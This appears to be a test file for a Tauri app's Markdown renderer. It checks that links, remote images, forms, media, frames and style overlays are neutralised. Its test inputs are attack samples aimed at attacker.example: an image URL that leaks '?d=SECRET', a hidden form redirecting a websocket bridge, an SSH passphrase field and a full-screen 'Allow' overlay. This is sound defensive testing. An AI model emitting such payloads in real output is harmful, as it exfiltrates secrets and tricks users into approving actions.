import { clearMocks, mockIPC } from '@tauri-apps/api/mocks';
import { cleanup, fireEvent, render, screen } from '@testing-library/svelte';
import { afterEach, expect, test } from 'vitest';
import Markdown from './Markdown.svelte';

const globals = window as unknown as { isTauri?: boolean };

function inTauri(): { cmd: string; args: unknown }[] {
	const calls: { cmd: string; args: unknown }[] = [];
	mockIPC((cmd, args) => void calls.push({ cmd, args }));
	globals.isTauri = true;
	return calls;
}

afterEach(() => {
	cleanup();
	clearMocks();
	delete globals.isTauri;
});

test('in Tauri, a web link opens in the system browser instead of the app window', async () => {
	const calls = inTauri();
	render(Markdown, { text: 'See [the docs](https://example.org/guide?a=1).' });
	const followed = await fireEvent.click(screen.getByRole('link', { name: 'the docs' }));
	expect(followed).toBe(false);
	expect(calls).toEqual([{ cmd: 'plugin:opener|open_url', args: { url: 'https://example.org/guide?a=1' } }]);
});

test('in Tauri, a link that is not an absolute http or https address opens nothing', async () => {
	const calls = inTauri();
	render(Markdown, { text: '[mail](mailto:me@example.org) [file](src/main.ts) [ftp](ftp://example.org/x)' });
	for (const name of ['mail', 'file', 'ftp']) expect(await fireEvent.click(screen.getByRole('link', { name }))).toBe(false);
	expect(calls).toEqual([]);
});

test('in the browser, a link opens in a new tab as before', async () => {
	render(Markdown, { text: '[the docs](https://example.org/guide)' });
	const link = screen.getByRole('link', { name: 'the docs' });
	expect(link.getAttribute('target')).toBe('_blank');
	expect(await fireEvent.click(link)).toBe(true);
});

test('a remote image becomes a link to it instead of being fetched', () => {
	const { container } = render(Markdown, { text: '![chart](https://attacker.example/?d=SECRET) and <img src=https://attacker.example/pixel.png>' });
	expect(container.querySelector('img')).toBeNull();
	expect(screen.getByRole('link', { name: 'Image: chart' }).getAttribute('href')).toBe('https://attacker.example/?d=SECRET');
});

test('forms, inputs, buttons, media, frames, and style elements are stripped', () => {
	const { container } = render(Markdown, {
		text: [
			'<form action="/"><input type=hidden name=transport value=ws><input type=hidden name=bridge value=wss://attacker.example><button>Reconnect</button></form>',
			'<input type=password placeholder="SSH key passphrase">',
			'<video autoplay src="https://attacker.example/v.mp4"></video><audio autoplay src="https://attacker.example/a.mp3"></audio>',
			'<iframe src="https://attacker.example/"></iframe><style>body { display: none }</style><svg><a href="https://attacker.example/">x</a></svg>',
		].join('\n\n'),
	});
	expect(container.querySelector('form, input, button, video, audio, source, iframe, style, svg, object, embed')).toBeNull();
});

test('a style attribute cannot cover the app, and app classes and data attributes do not pass', () => {
	const { container } = render(Markdown, { text: '<div style="position:fixed;inset:0;z-index:9999" class="request" data-pending="true">Allow</div>\n\n<p style="color:red">hi</p>' });
	const markdown = container.querySelector('.markdown');
	expect(markdown?.querySelector('[style], [class], [data-pending]')).toBeNull();
	expect(markdown?.textContent).toContain('Allow');
});

test('markdown keeps its headings, lists, tables, code, emphasis, and task list marks', () => {
	const { container } = render(Markdown, { text: '# Title\n\n- [x] done\n- [ ] open\n\n| a | b |\n|:-:|---|\n| 1 | 2 |\n\n```js\nlet x = 1;\n```\n\n**bold** _em_ ~~gone~~ `code`' });
	const tags = [...container.querySelectorAll('.markdown *')].map((node) => node.tagName.toLowerCase());
	expect(tags).toEqual(['h1', 'ul', 'li', 'li', 'table', 'thead', 'tr', 'th', 'th', 'tbody', 'tr', 'td', 'td', 'pre', 'code', 'p', 'strong', 'em', 'del', 'code']);
	expect(container.querySelector('th')?.getAttribute('align')).toBe('center');
	expect([...container.querySelectorAll('li')].map((item) => item.textContent?.trim())).toEqual(['☑ done', '☐ open']);
});
